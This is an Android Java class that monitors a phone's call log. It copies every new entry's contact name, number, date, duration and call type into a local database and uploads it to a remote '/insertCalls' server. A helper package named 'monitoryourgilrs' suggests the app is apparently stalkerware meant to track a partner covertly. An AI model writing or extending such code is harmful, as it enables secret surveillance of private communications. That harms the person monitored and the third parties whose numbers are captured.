package call.log;

import android.Manifest;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Network;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;

import androidx.core.app.ActivityCompat;


import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;
import Beans.ResponseBean;
import utils.SetUtil;
import utils.VolleyUtils;

import static utils.TimeUtils.dateToString;


public class CallContentObserver extends ContentObserver {
    private Context myContext;
    private static final String TAG = "CALLTRACKER";
    private Uri callUri = CallLog.Calls.CONTENT_URI;
    final private int REQUEST_CODE_ASK_PERMISSIONS = 200;
    private String callURL = VolleyUtils.IP + "/insertCalls";
    private int repeat = 0;
    private SQLiteDatabase db;

    private String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
            , CallLog.Calls.NUMBER// 通话记录的电话号码
            , CallLog.Calls.DATE// 通话记录的日期
            , CallLog.Calls.DURATION// 通话时长
            , CallLog.Calls.TYPE};// 通话类型}


    /**
     * Creates a content observer.
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public CallContentObserver(Handler handler, Context context) {
        super(handler);
        myContext = context;
    }

    @Override
    public void onChange(boolean selfChange,Uri uri) {
        super.onChange(selfChange);
        Log.i(TAG,uri.toString());
        if( ++repeat >1) {
            storeData();
            repeat = 0;
        }
    }

    private void addCallLOg() {  //添加通话记录
        Log.i(TAG, "添加通话 alog");
        ContentValues values = new ContentValues();
        values.clear();
        values.put(CallLog.Calls.CACHED_NAME, "lum");
        values.put(CallLog.Calls.NUMBER, 123456789);
        values.put(CallLog.Calls.TYPE, "1");
//        values.put(CallLog.Calls.DATE, CallLog.getmCallLogDate());
//        values.put(CallLog.Calls.DURATION, calllog.getmCallLogDuration());
        values.put(CallLog.Calls.NEW, "0");// 0已看1未看 ,由于没有获取默认全为已读
        if (ActivityCompat.checkSelfPermission(myContext, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        myContext.getContentResolver().insert(CallLog.Calls.CONTENT_URI, values);

    }

    //获取通话记录
    private void getContentCallLog() {
        if (ActivityCompat.checkSelfPermission(myContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = myContext.getContentResolver().query(callUri, // 查询通话记录的URI
                columns
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        Log.i(TAG, "cursor count:" + cursor.getCount());
        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));  //姓名
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));  //号码
            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)); //获取通话日期
            String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
            String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));
            int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));//获取通话时长，值为多少秒
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)); //获取通话类型：1.呼入2.呼出3.未接
            String dayCurrent = new SimpleDateFormat("dd").format(new Date());
            String dayRecord = new SimpleDateFormat("dd").format(new Date(dateLong));

            Log.i(TAG, "Call log: " + "\n"
                    + "name: " + name + "\n"
                    + "phone number: " + number + "\n"
                    + "duration: " + duration + "\n"
                    + "date" + date + "\n"

            );

        }

    }

    protected void storeData() {
        final com.dk.monitoryourgilrs.DbHelper dh = com.dk.monitoryourgilrs.DbHelper.getInstance(myContext);
        db = dh.getWritableDatabase();

        if (ActivityCompat.checkSelfPermission(myContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        Cursor cursor = myContext.getContentResolver().query(callUri, // 查询通话记录的URI
                columns
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        final ContentValues values=new ContentValues();
        final long IMEI = 00001;
        while (cursor.moveToNext()) {
            values.put("_id", System.currentTimeMillis());
            values.put("imei",IMEI);
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            if(name == null || name.equals("")){
                name = "UNKNOWN";
            }
            values.put("name",name);  //姓名
            values.put("number",cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));  //号码
            values.put("date", dateToString(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))); //获取通话日期
            values.put("duration", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION)));//获取通话时长，值为多少秒
            values.put("type",cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE))); //获取通话类型：1.呼入2.呼出3.未接
            values.put("updateServer",-1);
            Log.i(TAG,"Data Stored in Local DB");
//            Log.i("NAME",cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
            db.insert("calllog", null, values);
        break;
        }
        cursor.close();
        final Cursor data = db.rawQuery("select * from calllog ORDER BY date DESC", null);
        System.out.println("dbcount: " + data.getCount());
        while (data.moveToNext()) {
            final int updateServer = data.getInt(7 );
            System.out.println("updateServer: " + updateServer);
            if(updateServer == -1){
                final long _id = data.getLong(0);
                values.put("_id",_id);
                values.put("imei",data.getInt(1));
                values.put("name",data.getString(2));  //姓名
                values.put("number",data.getString(3));  //号码
                values.put("date", data.getString(4)); //获取通话日期
                values.put("duration",  data.getInt(5));//获取通话时长，值为多少秒
                values.put("type",data.getInt(6)); //获取通话类型：1.呼入2.呼出3.未接
                values.put("updateServer",1);

                //to do update server
//               int result =  CallServer.serverUpdateCallLogs(values);
                if (utils.NetWorkUtils.isNetworkConnected(myContext)) {
                    Log.v(TAG, "NetWork ok !");

                   VolleyUtils.create(myContext)
                        .post(callURL, ResponseBean.class, new VolleyUtils.OnResponse<ResponseBean>() {
                                @Override
                                public void OnMap(Map<String, String> map) {
                                    map.put("_id", values.getAsString("_id"));
                                    map.put("imei", values.getAsString("imei"));
                                    map.put("name", values.getAsString("name"));
                                    map.put("number", values.getAsString("number"));
                                    map.put("date", values.getAsString("date"));
                                    map.put("duration", values.getAsString("duration"));
                                    map.put("type", values.getAsString("type"));
                                }

                                @Override
                                public void onSuccess(ResponseBean response) {
                                    Log.e(TAG, "response---->" + response);
                                    db.update("calllog",values,"_id = ?", new String[]{String.valueOf(_id)});
                                }

                                @Override
                                public void onError(String error) {
                                    Log.e(TAG, "error---->" + error);
                                }
                            });
                }else{
                    Log.v(TAG, "NetWork not ok !");
                }
            }
        }
        data.close();
    }
}